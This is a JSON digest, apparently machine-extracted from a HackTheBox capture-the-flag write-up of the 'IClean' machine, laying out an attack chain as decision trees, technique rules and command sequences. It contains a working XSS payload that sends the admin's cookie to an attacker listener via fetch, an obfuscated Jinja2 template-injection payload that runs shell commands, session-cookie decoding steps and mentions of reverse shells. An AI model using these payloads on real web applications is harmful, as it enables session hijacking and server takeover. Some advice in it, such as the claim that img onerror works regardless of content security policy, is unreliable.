{
  "writeup_id": "Htb_Iclean",
  "scenario_fingerprint": {
    "scenario_name": "linux_web_xss_ssti_privilege_escalation",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+80",
    "service_combination": "ssh+http",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "cross_site_scripting",
    "privilege_path": "xss_to_ssti_to_database_to_sudo",
    "attack_complexity": "medium",
    "estimated_time": "90-120 minutes",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "flask_web_application",
      "xss_cookie_theft",
      "server_side_template_injection",
      "database_hash_cracking",
      "pdf_manipulation_privilege_escalation"
    ],
    "environmental_clues": [
      "werkzeug_python_server",
      "flask_404_pages",
      "admin_dashboard_access",
      "quote_submission_form",
      "login_authentication"
    ],
    "similar_scenarios": [
      "flask_ssti_boxes",
      "web_app_privilege_escalation"
    ],
    "unique_aspects": [
      "cleaning_company_theme",
      "pdf_attachment_file_read",
      "multi_stage_web_exploitation"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "XSS_Cookie_Theft",
        "success_reason": "Session cookie not protected with HttpOnly flag",
        "prerequisite_indicators": [
          "user_input_reflected_in_html",
          "admin_user_activity_present",
          "session_cookies_exist"
        ],
        "recognition_patterns": [
          "HTML injection successful in forms",
          "JavaScript execution in onerror events",
          "Cookie values returned in HTTP requests"
        ],
        "failure_modes": [
          "httponly_flag_set",
          "content_security_policy_blocks_requests",
          "no_admin_activity",
          "input_sanitization_present"
        ],
        "environmental_factors": [
          "flask_default_session_handling",
          "missing_security_headers",
          "admin_reviewing_user_submissions"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "10-30 minutes"
      },
      {
        "technique": "Flask_Session_Manipulation",
        "success_reason": "Predictable session structure with MD5 role hash",
        "prerequisite_indicators": [
          "flask_framework_detected",
          "session_cookie_structure_visible",
          "role_based_access_control"
        ],
        "recognition_patterns": [
          "flask-unsign successfully decodes cookie",
          "MD5 hash patterns in session data",
          "role field in session structure"
        ],
        "failure_modes": [
          "session_signing_key_unknown",
          "complex_session_structure",
          "additional_validation_checks"
        ],
        "environmental_factors": [
          "default_flask_session_implementation",
          "weak_session_design",
          "predictable_hash_algorithms"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "5-15 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Admin session cookie via XSS",
        "discovery_method": "Cross-site scripting in quote form service field",
        "why_critical": "Bypassed authentication to access admin dashboard",
        "how_to_recognize": [
          "HTML injection successful in user forms",
          "JavaScript execution possible",
          "Session cookies not HttpOnly protected",
          "Admin user actively reviewing submissions"
        ],
        "follow_up_actions": [
          "decode_session_cookie",
          "access_admin_dashboard",
          "enumerate_admin_functionality",
          "look_for_additional_vulnerabilities"
        ]
      },
      {
        "discovery": "Flask session with MD5 role hash",
        "discovery_method": "flask-unsign cookie decoding",
        "why_critical": "Revealed predictable session structure for privilege escalation",
        "how_to_recognize": [
          "Flask framework indicators (Werkzeug headers)",
          "Session cookie format matches Flask pattern",
          "Role field contains MD5 hash",
          "Hash corresponds to 'admin' string"
        ],
        "follow_up_actions": [
          "set_cookie_in_browser",
          "access_privileged_areas",
          "enumerate_admin_functions",
          "test_for_additional_injection_points"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "unauthenticated_user",
        "escalation_method": "XSS_to_Admin_Session",
        "why_possible": "Admin reviews user submissions without HttpOnly cookie protection",
        "recognition_signs": [
          "user_input_forms_present",
          "html_injection_successful",
          "javascript_execution_possible",
          "admin_activity_indicators"
        ],
        "exploitation_path": "HTML Injection → XSS → Cookie Theft → Admin Access"
      },
      {
        "privilege_level": "admin_dashboard_access",
        "escalation_method": "Admin_Function_Exploitation",
        "why_possible": "Admin dashboard likely contains additional attack vectors",
        "recognition_signs": [
          "admin_dashboard_accessible",
          "additional_forms_and_functions",
          "file_upload_capabilities",
          "template_injection_opportunities"
        ],
        "exploitation_path": "Admin Dashboard → SSTI/File Upload → Code Execution"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found only ports 22 and 80 open on Linux host",
        "decision": "Focus on web application enumeration and exploitation",
        "reasoning": "Limited attack surface suggests web app is primary entry point",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "ssh_brute_force",
            "when": "if web exploitation fails"
          },
          {
            "option": "service_version_exploits",
            "when": "if known CVEs exist"
          }
        ],
        "success_indicators": [
          "web_application_accessible",
          "technology_stack_identified",
          "input_fields_discovered"
        ],
        "next_decision": "identify_web_vulnerabilities"
      },
      {
        "step": 2,
        "situation": "Flask web application with quote form and login page",
        "decision": "Test for XSS in quote form before attempting auth bypass",
        "reasoning": "Quote form accepts user input and may be viewed by admin users",
        "confidence": 0.85,
        "prerequisites": [
          "input_forms_identified",
          "flask_application_confirmed"
        ],
        "success_indicators": [
          "html_injection_successful",
          "javascript_execution_confirmed"
        ],
        "failure_fallbacks": [
          "sql_injection_testing",
          "directory_brute_force",
          "credential_guessing"
        ]
      },
      {
        "step": 3,
        "situation": "XSS confirmed in quote form",
        "decision": "Attempt cookie theft via XSS payload",
        "reasoning": "Admin likely reviews quotes, cookies may not be HttpOnly protected",
        "confidence": 0.8,
        "prerequisites": [
          "xss_confirmed",
          "admin_interaction_likely"
        ],
        "success_indicators": [
          "session_cookie_captured",
          "admin_privileges_obtained"
        ],
        "failure_fallbacks": [
          "keylogger_payload",
          "csrf_token_theft",
          "admin_action_automation"
        ]
      },
      {
        "step": 4,
        "situation": "Admin session cookie obtained",
        "decision": "Access admin dashboard and enumerate SSTI opportunities",
        "reasoning": "Flask applications commonly vulnerable to SSTI in template rendering",
        "confidence": 0.75,
        "prerequisites": [
          "admin_access_confirmed",
          "flask_templating_suspected"
        ],
        "success_indicators": [
          "template_injection_confirmed",
          "code_execution_achieved"
        ],
        "failure_fallbacks": [
          "file_upload_vulnerabilities",
          "admin_function_abuse",
          "database_access"
        ]
      }
    ],
    "branching_logic": {
      "if_xss_succeeds": {
        "action": "capture_admin_session",
        "tools": [
          "python_http_server",
          "custom_xss_payload"
        ],
        "next_phase": "admin_dashboard_enumeration"
      },
      "if_cookie_captured": {
        "action": "decode_and_analyze_session",
        "tools": [
          "flask-unsign",
          "browser_dev_tools"
        ],
        "next_phase": "authenticated_vulnerability_testing"
      },
      "if_admin_access_obtained": {
        "action": "enumerate_ssti_in_admin_functions",
        "purpose": "achieve_remote_code_execution",
        "tools": [
          "burp_suite",
          "custom_ssti_payloads"
        ]
      },
      "if_ssti_confirmed": {
        "action": "escalate_to_reverse_shell",
        "tools": [
          "python_reverse_shell",
          "netcat_listener"
        ],
        "next_phase": "privilege_escalation_enumeration"
      }
    },
    "optimization_rules": [
      {
        "rule": "prioritize_xss_over_sqli_in_flask_apps",
        "reasoning": "flask_apps_less_likely_to_have_direct_sql_injection",
        "applicability": "python_flask_applications"
      },
      {
        "rule": "test_ssti_immediately_after_admin_access",
        "reasoning": "flask_templating_commonly_vulnerable_to_injection",
        "applicability": "authenticated_flask_admin_panels"
      },
      {
        "rule": "use_img_onerror_for_reliable_xss_execution",
        "reasoning": "works_regardless_of_content_security_policy_restrictions",
        "applicability": "html_injection_confirmed"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Cross-Site Scripting (XSS)",
        "mitre_id": "T1059.007",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "web_application_present",
          "user_input_fields_exist",
          "insufficient_input_sanitization"
        ],
        "success_indicators": [
          "html_injection_successful",
          "javascript_execution_confirmed",
          "callback_received"
        ],
        "incompatible_with": [
          "strict_csp_policy",
          "comprehensive_input_validation",
          "output_encoding_implemented"
        ],
        "confidence_boosters": [
          "form_fields_present",
          "dynamic_content_generation",
          "user_generated_content"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "Server-Side Template Injection (SSTI)",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "template_engine_in_use",
          "user_input_processed_by_templates",
          "flask_jinja2_detected"
        ],
        "success_indicators": [
          "template_syntax_evaluation",
          "code_execution_achieved",
          "werkzeug_python_headers"
        ],
        "incompatible_with": [
          "template_sandboxing",
          "strict_input_validation",
          "template_isolation"
        ],
        "confidence_boosters": [
          "flask_framework_detected",
          "python_werkzeug_headers",
          "dynamic_template_rendering"
        ],
        "typical_success_rate": 0.78,
        "estimated_time": "15-45 minutes"
      },
      {
        "technique": "Directory Traversal",
        "mitre_id": "T1083",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "file_access_functionality",
          "insufficient_path_validation",
          "web_application_present"
        ],
        "success_indicators": [
          "sensitive_file_access",
          "path_traversal_successful",
          "system_file_disclosure"
        ],
        "incompatible_with": [
          "strict_path_validation",
          "chroot_jail",
          "file_access_restrictions"
        ],
        "confidence_boosters": [
          "file_download_features",
          "document_management_system",
          "pdf_generation_tools"
        ],
        "typical_success_rate": 0.45,
        "estimated_time": "20-60 minutes"
      }
    ],
    "environmental_detectors": {
      "flask_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "Werkzeug",
          "Python",
          "Flask"
        ],
        "confidence_threshold": 0.9
      },
      "web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "apache",
          "nginx",
          "werkzeug"
        ],
        "confidence_threshold": 0.85
      },
      "ubuntu_linux": {
        "port_indicators": [
          22
        ],
        "service_indicators": [
          "ssh"
        ],
        "banner_indicators": [
          "OpenSSH 8.9p1 Ubuntu",
          "Apache/2.4.52 (Ubuntu)"
        ],
        "confidence_threshold": 0.95
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "xss_cookie_theft",
          "when": "web_forms_detected",
          "reason": "immediate_session_hijacking_potential"
        },
        {
          "attack": "ssti_exploitation",
          "when": "flask_jinja2_detected",
          "reason": "direct_code_execution_capability"
        }
      ],
      "medium_priority": [
        {
          "attack": "directory_bruteforce",
          "when": "web_service_detected",
          "reason": "reveals_hidden_endpoints_and_admin_panels"
        },
        {
          "attack": "sql_injection",
          "when": "login_forms_detected",
          "reason": "authentication_bypass_potential"
        }
      ],
      "low_priority": [
        {
          "attack": "ssh_bruteforce",
          "when": "ssh_service_detected",
          "reason": "time_intensive_low_success_rate"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Cross-Site Scripting (XSS) Cookie Theft",
        "mitre_id": "T1539",
        "category": "credential_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "HTML Injection",
            "command_template": "<img src=\"http://{attacker_ip}/{identifier}\" onerror=fetch(\"http://{attacker_ip}/?c=\"+document.cookie) />",
            "actual_command": "<img src=\"http://10.10.14.6/service\" onerror=fetch(\"http://10.10.14.6/?c=\"+document.cookie) />",
            "output_pattern": "session=eyJ*",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "flask-unsign",
            "command_template": "flask-unsign -d -c {cookie_value}",
            "actual_command": "flask-unsign -d -c eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZpGnpw.yZMEmiZOTLiezgsFo846uaB6bVY",
            "success_factors": [
              "flask_session_cookie",
              "unsigned_cookie"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "html_injection_vulnerability",
          "admin_user_visits_page",
          "cookie_not_httponly"
        ],
        "success_indicators": [
          "cookie_received_at_listener",
          "cookie_decodes_successfully",
          "admin_access_granted"
        ],
        "common_failures": [
          "httponly_cookie_flag",
          "csp_blocking_requests",
          "admin_not_visiting_page"
        ],
        "follow_up_techniques": [
          "session_hijacking",
          "admin_panel_access",
          "privilege_escalation"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "Server-Side Template Injection (SSTI)",
        "mitre_id": "T1190",
        "category": "execution",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "Jinja2 SSTI Payload",
            "command_template": "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('{command}')|attr('read')()}}",
            "actual_command": "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            "output_pattern": "uid=33(www-data) gid=33(www-data)",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "flask_jinja2_template_engine",
          "user_input_reflected_in_template",
          "admin_access_to_vulnerable_endpoint"
        ],
        "success_indicators": [
          "template_syntax_executed",
          "command_output_reflected",
          "rce_achieved"
        ],
        "common_failures": [
          "template_filtering_active",
          "sandboxed_environment",
          "input_sanitization"
        ],
        "follow_up_techniques": [
          "reverse_shell_establishment",
          "file_system_enumeration",
          "privilege_escalation"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Flask Session Cookie Analysis",
        "mitre_id": "T1552.001",
        "category": "credential_access",
        "phase": "credential_access",
        "tools_used": [
          {
            "name": "MD5 Hash Identification",
            "command_template": "echo -n \"{plaintext}\" | md5sum",
            "actual_command": "echo -n \"admin\" | md5sum",
            "output_pattern": "21232f297a57a5a743894a0e4a801fc3",
            "effectiveness_rating": 4,
            "reliability": 1.0
          }
        ],
        "prerequisites": [
          "flask_session_cookie_obtained",
          "cookie_structure_understood"
        ],
        "success_indicators": [
          "role_field_identified",
          "admin_hash_recognized",
          "session_privilege_understood"
        ],
        "common_failures": [
          "encrypted_session_data",
          "unknown_hash_format",
          "signed_cookie_verification"
        ],
        "follow_up_techniques": [
          "session_manipulation",
          "privilege_escalation",
          "admin_functionality_access"
        ],
        "time_investment": "2-5 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "flask-unsign",
        "use_case": "flask_session_cookie_analysis",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "low",
        "essential_for": [
          "flask_applications"
        ],
        "alternatives": [
          "manual_base64_decoding",
          "custom_scripts"
        ],
        "best_practices": [
          "decode_before_attempting_manipulation",
          "understand_cookie_structure",
          "check_for_secret_key_weaknesses"
        ]
      },
      {
        "tool": "feroxbuster",
        "use_case": "web_directory_enumeration",
        "effectiveness_rating": 4,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "gobuster",
          "dirbuster",
          "ffuf"
        ],
        "best_practices": [
          "use_appropriate_wordlists",
          "configure_proper_filtering",
          "check_status_codes_carefully"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "xss_to_admin_access",
        "steps": [
          {
            "step": 1,
            "command": "POST /sendMessage with service=<img src=\"http://10.10.14.6/service\" onerror=fetch(\"http://10.10.14.6/?c=\"+document.cookie) />",
            "purpose": "Inject XSS payload to steal admin cookie",
            "expected_output": "HTTP request with stolen session cookie"
          },
          {
            "step": 2,
            "command": "flask-unsign -d -c [stolen_cookie]",
            "purpose": "Decode Flask session cookie",
            "expected_output": "{'role': '21232f297a57a5a743894a0e4a801fc3'}"
          },
          {
            "step": 3,
            "command": "Set cookie in browser and access /dashboard",
            "purpose": "Hijack admin session",
            "expected_output": "Admin dashboard access granted"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "5-15 minutes"
      },
      {
        "sequence_name": "ssti_to_rce",
        "steps": [
          {
            "step": 1,
            "command": "POST /QRGenerator with qr_link={{7*7}}",
            "purpose": "Test for SSTI vulnerability",
            "expected_output": "49 in response indicating template execution"
          },
          {
            "step": 2,
            "command": "POST /QRGenerator with Jinja2 RCE payload for 'id' command",
            "purpose": "Achieve remote code execution",
            "expected_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
          },
          {
            "step": 3,
            "command": "Execute reverse shell payload through SSTI",
            "purpose": "Establish persistent shell access",
            "expected_output": "Reverse shell connection as www-data"
          }
        ],
        "success_rate": 0.9,
        "typical_duration": "10-20 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "IClean",
      "difficulty": "Medium",
      "os": "Ubuntu 22.04",
      "platform": "HackTheBox",
      "release_date": "2024-04-06",
      "author": "LazyTitan33",
      "estimated_time": "60-90 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "xss",
        "ssti",
        "sudo_abuse"
      ],
      "key_vulnerabilities": [
        "cross_site_scripting",
        "server_side_template_injection",
        "qpdf_file_read"
      ],
      "environment_type": "web_application_linux",
      "real_world_relevance": "high",
      "learning_value": [
        "xss_cookie_theft",
        "ssti_exploitation",
        "pdf_manipulation",
        "database_credential_extraction"
      ],
      "prerequisite_knowledge": [
        "web_application_security",
        "template_injection",
        "linux_privilege_escalation"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "client_side_attacks",
        "template_injection",
        "privilege_escalation"
      ],
      "attack_types": [
        "initial_access",
        "credential_access",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "input_validation",
        "template_security",
        "sudo_restrictions",
        "secure_coding"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Templated",
        "Shoppy",
        "Inject"
      ],
      "similarity_reasons": [
        "ssti_exploitation",
        "web_app_focus",
        "database_credentials"
      ],
      "unique_aspects": [
        "qpdf_abuse",
        "pdf_file_attachment",
        "xss_to_ssti_chain"
      ],
      "difficulty_factors": [
        "multi_stage_exploitation",
        "template_injection_complexity",
        "pdf_manipulation_knowledge"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T21:58:35.853888",
    "original_file": "0xdf_writeups/Htb Iclean.md",
    "content_length": 32580,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}